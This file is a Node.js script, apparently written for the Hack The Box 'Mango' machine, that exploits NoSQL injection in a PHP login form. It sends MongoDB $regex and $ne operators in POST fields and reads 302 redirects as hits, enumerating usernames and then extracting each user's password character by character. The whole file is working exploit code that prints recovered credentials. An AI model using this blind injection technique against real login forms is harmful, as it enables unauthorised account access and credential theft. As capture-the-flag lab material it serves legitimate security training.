const axios = require('axios');

const tryRequest = (data) => {
    return new Promise((resolve, reject) => {
        axios({
            maxRedirects: 0,
            method: 'post',
            url: 'http://staging-order.mango.htb/index.php',
            headers: {
                Cookie: 'PHPSESSID=rt92u3ha1le5t0iopd2kaks2d9',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            data: data,
            validateStatus: (status) => {
                return status <= 302;
            }
        }).then(res => {
            resolve(res.status === 302);
        }).catch(res => {
            reject();
        });
    });
};

let regexChars = ".[]{}+()*^$\\/?|";

async function doStuff() {
    const usernamePrefixes = [];

    process.stdout.write("Checking for username that starts with ");
    //find potential usernames
    let curIdx = 126;
    while (curIdx > 31) {
        let testChar = String.fromCharCode(curIdx);
        if (regexChars.includes(testChar)) {
            testChar = "\\" + testChar;
        }
        process.stdout.write(testChar);
        userEntry = await tryRequest(`username[$regex]=${encodeURIComponent('^' + testChar)}&password[$ne]=1`);
        if (userEntry) {
            console.log('\nFound username that starts with ' + testChar);
            usernamePrefixes.push(testChar);
        }
        curIdx--;
    }
    console.log('\nFound prefixes: ' + usernamePrefixes);

    // enumerate user names
    let usernames = [];
    for(let i = 0; i < usernamePrefixes.length; i++) {
        let username = usernamePrefixes[i];
        let foundUsername = false;
        curIdx = 126;
        process.stdout.write("Enumerating username that starts with " + username + ' ');
        while (!foundUsername) {
            let testChar = String.fromCharCode(curIdx);
            if (regexChars.includes(testChar)) {
                testChar = "\\" + testChar;
            }
            process.stdout.write(testChar);
            let foundChar = await tryRequest(`username[$regex]=^${encodeURIComponent(username + testChar)}&password[$ne]=1`);
            if (foundChar) {
                username += testChar;
                curIdx = 126;
                console.log('\nFound character, current username is ' + username);
                foundUsername = await tryRequest(`username[$regex]=^${encodeURIComponent(username)}$&password[$ne]=1`);
            } else {
                curIdx--;
            }
        }
        console.log('\nFound full username ' + username);
        usernames.push(username);
    }

    console.log('\nUsernames ' + usernames);

    // enumerate passwords
    let users = {};
    for(let i = 0; i < usernames.length; i++) {
        let username = usernames[i];
        let password = '';
        let foundPassword = false;
        curIdx = 126;
        process.stdout.write("Enumerating password for " + username + ' ');
        while (!foundPassword) {
            let testChar = String.fromCharCode(curIdx);
            if (regexChars.includes(testChar)) {
                testChar = "\\" + testChar;
            }
            process.stdout.write(testChar);
            let foundChar = await tryRequest(`username=${username}&password[$regex]=^${encodeURIComponent(password + testChar)}`);
            if (foundChar) {
                password += testChar;
                curIdx = 126;
                console.log('\nFound character, current password is ' + password);
                foundPassword = await tryRequest(`username=${username}&password[$regex]=^${encodeURIComponent(password)}$`);
            } else {
                curIdx--;
            }
        }
        console.log('\nFound full password ' + password);
        users[username] = password;
    }
    console.log(JSON.stringify(users, null, 2));

}

doStuff();